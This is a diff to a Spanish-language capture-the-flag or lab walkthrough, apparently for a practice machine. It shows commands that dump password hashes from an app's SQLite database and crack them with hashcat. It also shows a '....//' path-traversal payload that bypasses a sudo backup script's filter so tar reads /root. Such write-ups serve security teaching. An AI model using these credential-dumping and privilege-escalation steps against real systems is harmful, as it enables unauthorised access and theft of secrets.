@@ -72,8 +72,10 @@ sqlite3 /var/www/app/instance/database.db "select username, password from users;
 ```
 
 ```text
-martin | $2b$12$...
+martin | $2y$...  (o MD5, según la build)
 ```
+
+Mirar el prefijo antes de elegir el modo de `hashcat`: bcrypt es `-m 3200`, MD5 es `-m 0`.
 
 ```bash
 hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
@@ -90,7 +92,7 @@ sudo -l
 (root) NOPASSWD: /usr/bin/backy.sh
 ```
 
-`backy.sh` lee un JSON con `directories_to_archive` y hace un `tar`. La validación descarta rutas que empiezan por `/root` pero no resuelve `..`:
+`backy.sh` lee un JSON con `directories_to_archive` y hace un `tar`. La validación exige que la ruta empiece por `/home` o `/var` y limpia `../` una sola pasada: con `....//` la limpieza deja `../` y el `tar` acaba leyendo `/root`.
 
 ```bash
 mkdir -p /tmp/exf && cd /tmp/exf
@@ -99,7 +101,7 @@ cat > cfg.json <<'EOF'
   "destination": "/tmp/exf/",
   "multiprocessing": true,
   "verbose_log": false,
-  "directories_to_archive": ["/root/..//root/"]
+  "directories_to_archive": ["/home/....//root"]
 }
 EOF
 sudo /usr/bin/backy.sh /tmp/exf/cfg.json
